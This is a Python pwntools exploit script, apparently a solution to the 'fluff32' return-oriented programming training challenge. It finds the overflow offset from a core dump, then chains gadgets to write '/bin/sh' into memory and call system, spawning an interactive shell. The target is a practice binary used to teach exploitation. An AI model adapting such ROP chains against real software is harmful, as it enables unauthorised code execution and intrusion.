from pwn import *
import os


def put_value_in_edx(val):
    tmp= p32(0x080483e1) # pop ebx ; ret 
    tmp+= p32(val)
    tmp+= p32(0x08048671) # xor edx, edx ; pop esi ; ret
    tmp+= p32(0xdeadbeef)
    tmp+= p32(0x0804867b) # xor edx, ebx ; pop ebp ; mov edi, 0xdeadbeef ; ret
    tmp+= p32(0xdeadbeef)
    return tmp[:]

def main():
    payload = cyclic(128)
    p = process('./fluff32')
    p.recv(100500)
    p.sendline(payload)
    p.wait_for_close()


    print 'Enabling coredumping'
    os.system('ulimit -c unlimited')
    core = Coredump('./core')
    assert p32(core.eip) in payload
    os.system('ulimit -c 0')
    os.system('rm -f ./core')
    print 'Disabling coredumping'

    p = process('./fluff32')
    
    rop = ''
   
    rop+= put_value_in_edx(0x0804a028)
    rop+= p32(0x08048689) # xchg edx, ecx ; pop ebp ; mov edx, trash ; ret
    rop+= p32(0)
    rop+= put_value_in_edx(u32('/bin'))
    rop+= p32(0x08048692) #  pop edi ; mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
    for i in xrange(3):
        rop+= p32(0)
    rop+= put_value_in_edx(0x0804a02c)
    rop+= p32(0x08048689) # xchg edx, ecx ; pop ebp ; mov edx, trash ; ret
    rop+= p32(0)
    rop+= put_value_in_edx(u32('/sh\x00'))
    rop+= p32(0x08048692) #  pop edi ; mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
    for i in xrange(3):
        rop+= p32(0)
    rop+= put_value_in_edx(SYSTEM_GOT_PLT)
    rop+= p32(0x0804851d) # call edx
    rop+= p32(0x0804a028) # "/bin/sh\x00"


    payload = fit ({ 0 : binsh, cyclic_find(core.eip) : rop })
    
    with open('payload', 'wb') as f:
        f.write(payload)
        f.write('\n')

    p.recv(100500)
    p.sendline(payload)
    p.interactive()
    p.close()


if __name__ == '__main__':
    
    SYSTEM_GOT_PLT = 0x08048430
    binsh = '/bin/sh\x00'
    main()
